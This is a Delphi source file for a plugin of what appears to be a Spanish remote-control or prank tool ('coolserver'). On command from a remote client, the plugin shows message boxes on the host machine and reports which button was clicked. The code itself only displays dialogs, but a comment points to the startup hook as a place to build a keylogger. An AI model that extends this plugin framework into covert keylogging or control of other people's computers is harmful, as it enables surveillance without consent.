library MensajesS;


uses
  windows,
  UnitBromas,
  Winsock;

var
  ConId : integer;
  PNombre : string;

{Esta funcion es llamada al iniciar coolserver, se realiza en un thread independiente}
{puede ser muy util por ejemplo para programar un keylogger u otros programas similares}
procedure CargaOffline();stdcall;
begin
//En el caso de los mensajes no nos sirve para nada :p
end;


{Esta función es llamada cuando se abre el plugin desde el cliente}
procedure Start(id:integer;nombre:string);stdcall;
begin
  ConID := ID; //Socket
  PNombre := nombre; //Nombre del plugin
end;


procedure Enviars(S: string);
begin
  //Para enviar información desde un plugin se envia en el siguiente formato:
  // PLUGINDATA|NOMBREPLUGIN|DATA#10#15#80#66#77#1#72#87
  s := 'PLUGINDATA|'+PNombre+'|'+s+#10#15#80#66#77#1#72#87;
  Send(ConID, S[1], Length(s), 0);
end;

function StrToInt(Value: string): integer;
var
  ErrorAt: integer;
begin
  val(Value, Result, ErrorAt);
end;

function IntToStr(Value: integer): string;
begin
  Str(Value, Result);
end;

{Al recibir información desde el cliente}
procedure RecData(data:string);stdcall;
var
  enviar : string;
  Recibido : string;
  TempStr, TempStr1, TempStr2, TempStr3 : string;
  Tipo : integer;
  BotonPulsado : integer;
begin
  Recibido := data;
  
  if Copy(Recibido, 1, 4) = 'MSJN' then
  begin
    Delete(Recibido, 1, 4);
    TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1); //Obtenemos el mensaje
    Delete(Recibido, 1, Pos('|', Recibido));
    TempStr1 := Copy(Recibido, 1, Pos('|', Recibido) - 1); //Obtenemos el titulo
    Delete(Recibido, 1, Pos('|', Recibido));
    TempStr2 := Copy(Recibido, 1, Pos('|', Recibido) - 1); //Tipo de mensaje
    Delete(Recibido, 1, Pos('|', Recibido));
    TempStr3 := Copy(Recibido, 1, Pos('|', Recibido) - 1);
    //Obtenemos los botones del mensaje

    Tipo := 0;
    //Miramos el tipo de mensaje
    if TempStr2 = 'WARN' then
      Tipo := MB_ICONERROR;
    if TempStr2 = 'QUES' then
      Tipo := MB_ICONQUESTION;
    if TempStr2 = 'EXCL' then
      Tipo := MB_ICONEXCLAMATION;
    if TempStr2 = 'INFO' then
      Tipo := MB_ICONINFORMATION;

    case StrToInt(TempStr3) of //Lo transformamos en entero para poder usar el case
      0: BotonPulsado := MessageBox(0, PChar(TempStr), PChar(TempStr1), Tipo + MB_OK);
      1: BotonPulsado := MessageBox(0, PChar(TempStr), PChar(TempStr1),
                    Tipo + MB_OKCANCEL);
      2: BotonPulsado := MessageBox(0, PChar(TempStr), PChar(TempStr1),
                    Tipo + MB_RETRYCANCEl);
      3: BotonPulsado := MessageBox(0, PChar(TempStr), PChar(TempStr1), Tipo + MB_YESNO);
      4: BotonPulsado := MessageBox(0, PChar(TempStr), PChar(TempStr1),
                    Tipo + MB_YESNOCANCEL);
      5: BotonPulsado := MessageBox(0, PChar(TempStr), PChar(TempStr1),
                    Tipo + MB_ABORTRETRYIGNORE);
    else    //nunca debería pasar pero es mejor prevenir
        BotonPulsado := MessageBox(0, PChar(TempStr), PChar(TempStr1), Tipo + MB_OK);

    end;
    
    case BotonPulsado of
      idOk: Enviars(inttostr(idOk));
      idCancel: Enviars(inttostr(idCancel));
      idRetry: Enviars(inttostr(idRetry));
      idYes: Enviars(inttostr(idYes));
      idNo: Enviars(inttostr(idNo));
      idAbort: Enviars(inttostr(idAbort));
      idIgnore: Enviars(inttostr(idIgnore));
    end;
  end;
end;

{Cuando se desconecta el servidor es llamada}
procedure Stop();Stdcall;
begin 
end;

exports CargaOffline, Start, RecData, Stop;

end.
